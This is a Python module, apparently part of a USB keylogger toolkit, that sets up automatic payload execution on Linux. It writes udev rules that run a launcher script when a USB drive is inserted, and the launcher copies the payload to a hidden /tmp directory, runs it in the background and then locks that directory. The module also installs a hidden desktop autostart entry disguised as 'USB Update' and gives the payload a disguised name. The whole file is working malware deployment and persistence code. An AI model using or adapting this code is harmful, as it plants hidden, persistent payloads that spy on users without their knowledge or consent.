# Linux Auto-Execution Module
# Implements udev rule generation for USB auto-execution on Linux

import os
import sys
import subprocess
from datetime import datetime
from config import (
    DEBUG_MODE, LINUX_UDEV_RULE_NAME, LINUX_LAUNCHER_SCRIPT,
    LINUX_AUTOSTART_DESKTOP, MITRE_LOGGING_ENABLED, MITRE_TECHNIQUES
)

class LinuxUdevRuleManager:
    """Manages udev rule generation for USB auto-execution on Linux"""
    
    def __init__(self):
        self.is_linux = sys.platform == "linux"
        self.udev_rules_path = "/etc/udev/rules.d/"
        self.lib_udev_rules_path = "/lib/udev/rules.d/"
        
    def generate_udev_rule(self, launcher_script_path,
                          subsystem="block",
                          action="add",
                          kernel_pattern="sd[a-z][0-9]",
                          rule_name="99-usb-keylogger"):
        """
        Generate a udev rule for USB auto-execution.
        
        Args:
            launcher_script_path: Path to the launcher script
            subsystem: SUBSYSTEM match (usually "block" for USB drives)
            action: ACTION match (usually "add" for insertion)
            kernel_pattern: KERNEL match pattern
            rule_name: Base name for the rule file
            
        Returns:
            str: The generated udev rule
        """
        rule = (
            f'SUBSYSTEM=="{subsystem}", '
            f'ACTION=="{action}", '
            f'KERNEL=="{kernel_pattern}", '
            f'RUN+="{launcher_script_path}"'
        )
        return rule
    
    def generate_advanced_udev_rule(self, launcher_script_path,
                                   vendor_id=None,
                                   product_id=None,
                                   serial=None,
                                   rule_name="99-usb-keylogger"):
        """
        Generate an advanced udev rule with device identification.
        
        Args:
            launcher_script_path: Path to launcher script
            vendor_id: USB vendor ID (optional)
            product_id: USB product ID (optional)
            serial: USB serial number (optional)
            rule_name: Base name for rule file
            
        Returns:
            str: The generated udev rule
        """
        conditions = ['SUBSYSTEM=="usb"', 'ACTION=="add"']
        
        if vendor_id:
            conditions.append(f'ATTR{{idVendor}}=="{vendor_id}"')
        if product_id:
            conditions.append(f'ATTR{{idProduct}}=="{product_id}"')
        if serial:
            conditions.append(f'ATTR{{serial}}=="{serial}"')
        
        rule = ','.join(conditions) + f', RUN+="{launcher_script_path}"'
        return rule
    
    def create_udev_rule_file(self, rules_content, output_path=None):
        """
        Create a udev rule file.
        
        Args:
            rules_content: Single rule or list of rules
            output_path: Output file path (auto-generated if None)
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'rule_path': None,
            'error': None
        }
        
        if not self.is_linux:
            result['error'] = "Not running on Linux"
            return result
        
        try:
            if isinstance(rules_content, list):
                rules_content = '\n'.join(rules_content)
            
            if not output_path:
                output_path = os.path.join(
                    self.udev_rules_path,
                    f"{LINUX_UDEV_RULE_NAME}"
                )
            
            # Write rule file
            with open(output_path, 'w') as f:
                f.write(rules_content)
                f.write('\n')
            
            # Set appropriate permissions
            os.chmod(output_path, 0o644)
            
            result['rule_path'] = output_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created udev rule: {output_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create udev rule: {e}")
            return result
    
    def reload_udev_rules(self):
        """Reload udev rules without reboot."""
        if not self.is_linux:
            return False
        
        try:
            subprocess.run(
                ['udevadm', 'control', '--reload-rules'],
                capture_output=True
            )
            return True
        except Exception:
            return False
    
    def trigger_udev_event(self, device_path):
        """
        Trigger a udev event for a specific device.
        
        Args:
            device_path: Path to device (e.g., /dev/sdb1)
            
        Returns:
            bool: True if successful
        """
        if not self.is_linux:
            return False
        
        try:
            subprocess.run(
                ['udevadm', 'trigger', '--subsystem-match=block', 
                 f'--attr-match=devpath={device_path}'],
                capture_output=True
            )
            return True
        except Exception:
            return False
    
    def validate_udev_rule(self, rule_path):
        """
        Validate udev rule syntax.
        
        Args:
            rule_path: Path to rule file
            
        Returns:
            bool: True if valid
        """
        if not self.is_linux:
            return False
        
        try:
            result = subprocess.run(
                ['udevadm', 'test', '--action=add', rule_path],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except Exception:
            return False


class LinuxLauncherScriptManager:
    """Manages launcher script creation for USB auto-execution"""
    
    def __init__(self):
        self.is_linux = sys.platform == "linux"
        
    def generate_launcher_script(self, payload_path, 
                                 extraction_dir="/tmp/.usb_payload",
                                 hide_payload=True):
        """
        Generate a launcher script for USB payload execution.
        
        Args:
            payload_path: Path to payload on USB
            extraction_dir: Directory to extract payload
            hide_payload: Whether to hide files after execution
            
        Returns:
            str: The generated shell script content
        """
        script = f'''#!/bin/bash
# USB Auto-Execution Launcher
# Generated automatically

PAYLOAD_PATH="{payload_path}"
EXTRACTION_DIR="{extraction_dir}"

# Create extraction directory
mkdir -p "$EXTRACTION_DIR"

# Copy payload to extraction directory
cp "$PAYLOAD_PATH" "$EXTRACTION_DIR/payload"

# Set executable permissions
chmod +x "$EXTRACTION_DIR/payload"

# Execute payload in background
"$EXTRACTION_DIR/payload" &

# Clean up
sleep 2

# Optional: Hide extraction directory
if [ {str(hide_payload).lower()} = true ]; then
    chmod 000 "$EXTRACTION_DIR" 2>/dev/null
fi

exit 0
'''
        return script
    
    def create_launcher_script(self, payload_path, script_path=None,
                               extraction_dir="/tmp/.usb_payload"):
        """
        Create and save the launcher script.
        
        Args:
            payload_path: Path to payload on USB
            script_path: Output script path
            extraction_dir: Extraction directory
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'script_path': None,
            'error': None
        }
        
        try:
            script_content = self.generate_launcher_script(
                payload_path, extraction_dir
            )
            
            if not script_path:
                script_path = os.path.join(
                    os.path.dirname(payload_path),
                    LINUX_LAUNCHER_SCRIPT
                )
            
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            os.chmod(script_path, 0o755)
            
            result['script_path'] = script_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created launcher script: {script_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create launcher script: {e}")
            return result


class LinuxAutostartManager:
    """Manages desktop autostart entries for Linux"""
    
    def __init__(self):
        self.is_linux = sys.platform == "linux"
        self.autostart_path = os.path.expanduser(
            "~/.config/autostart/"
        )
        
    def generate_desktop_entry(self, payload_path, name="USB Update",
                               comment="USB Device Auto-Update Service",
                               no_display=True):
        """
        Generate a .desktop file for autostart.
        
        Args:
            payload_path: Path to payload executable
            name: Application name
            comment: Description
            no_display: Don't show in menu
            
        Returns:
            str: Desktop entry content
        """
        entry = f'''[Desktop Entry]
Type=Application
Name={name}
Comment={comment}
Exec={payload_path}
Terminal=false
Hidden={str(no_display).lower()}
NotShowIn=GNOME;KDE;XFCE;
X-GNOME-Autostart-enabled=true
X-KDE--autostart-after=panel
'''
        return entry
    
    def create_autostart_entry(self, payload_path, desktop_path=None,
                                name="USB Update"):
        """
        Create an autostart .desktop entry.
        
        Args:
            payload_path: Path to payload executable
            desktop_path: Output path for .desktop file
            name: Application name
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'desktop_path': None,
            'error': None
        }
        
        if not self.is_linux:
            result['error'] = "Not running on Linux"
            return result
        
        try:
            # Generate content
            content = self.generate_desktop_entry(payload_path, name)
            
            # Determine output path
            if not desktop_path:
                os.makedirs(self.autostart_path, exist_ok=True)
                desktop_path = os.path.join(
                    self.autostart_path,
                    f"{LINUX_AUTOSTART_DESKTOP}"
                )
            
            # Write file
            with open(desktop_path, 'w') as f:
                f.write(content)
            
            os.chmod(desktop_path, 0o644)
            
            result['desktop_path'] = desktop_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created autostart desktop entry: {desktop_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create desktop entry: {e}")
            return result


class LinuxUSBAutoExecution:
    """Complete USB auto-execution for Linux"""
    
    def __init__(self):
        self.udev_manager = LinuxUdevRuleManager()
        self.launcher_manager = LinuxLauncherScriptManager()
        self.autostart_manager = LinuxAutostartManager()
        self.payload_name = "usb_update"
        
    def create_usb_package(self, usb_drive_path, payload_file_path,
                           create_udev_rule=True,
                           create_launcher=True,
                           create_autostart=False):
        """
        Create a complete Linux USB package with auto-execution.
        
        Args:
            usb_drive_path: USB root path
            payload_file_path: Path to payload executable
            create_udev_rule: Create udev rule
            create_launcher: Create launcher script
            create_autostart: Create desktop autostart
            
        Returns:
            dict: Result with success status
        """
        result = {
            'success': False,
            'payload_path': None,
            'launcher_path': None,
            'udev_rule_path': None,
            'autostart_path': None,
            'error': None
        }
        
        try:
            # Copy payload to USB with disguised name
            payload_dest = os.path.join(usb_drive_path, self.payload_name)
            import shutil
            shutil.copy2(payload_file_path, payload_dest)
            os.chmod(payload_dest, 0o755)
            result['payload_path'] = payload_dest
            
            # Create launcher script
            if create_launcher:
                launcher_result = self.launcher_manager.create_launcher_script(
                    payload_dest
                )
                if launcher_result['success']:
                    result['launcher_path'] = launcher_result['script_path']
            
            # Create udev rule
            if create_udev_rule and result.get('launcher_path'):
                rule_content = self.udev_manager.generate_udev_rule(
                    result['launcher_path']
                )
                rule_result = self.udev_manager.create_udev_rule_file(
                    rule_content
                )
                if rule_result['success']:
                    result['udev_rule_path'] = rule_result['rule_path']
            
            # Create desktop autostart
            if create_autostart:
                autostart_result = self.autostart_manager.create_autostart_entry(
                    payload_dest
                )
                if autostart_result['success']:
                    result['autostart_path'] = autostart_result['desktop_path']
            
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Created Linux USB package successfully")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create USB package: {e}")
            return result
    
    def install_system_components(self, payload_path,
                                  require_root=True):
        """
        Install system-level components (udev rule, autostart).
        
        Args:
            payload_path: Path to payload executable
            require_root: Require root privileges
            
        Returns:
            dict: Installation result
        """
        result = {
            'success': False,
            'udev_installed': False,
            'autostart_installed': False,
            'error': None
        }
        
        if not self.is_linux:
            result['error'] = "Not running on Linux"
            return result
        
        # Create launcher script
        launcher_result = self.launcher_manager.create_launcher_script(
            payload_path
        )
        if not launcher_result['success']:
            result['error'] = "Failed to create launcher script"
            return result
        
        # Create udev rule (requires root)
        if require_root:
            rule_content = self.udev_manager.generate_udev_rule(
                launcher_result['script_path']
            )
            rule_result = self.udev_manager.create_udev_rule_file(
                rule_content
            )
            if rule_result['success']:
                result['udev_installed'] = True
                self.udev_manager.reload_udev_rules()
        
        # Create autostart entry (user-level)
        autostart_result = self.autostart_manager.create_autostart_entry(
            payload_path
        )
        if autostart_result['success']:
            result['autostart_installed'] = True
            result['success'] = True
        
        return result


# Global instances
linux_udev_manager = LinuxUdevRuleManager()
linux_launcher_manager = LinuxLauncherScriptManager()
linux_autostart_manager = LinuxAutostartManager()
linux_usb_auto_execution = LinuxUSBAutoExecution()
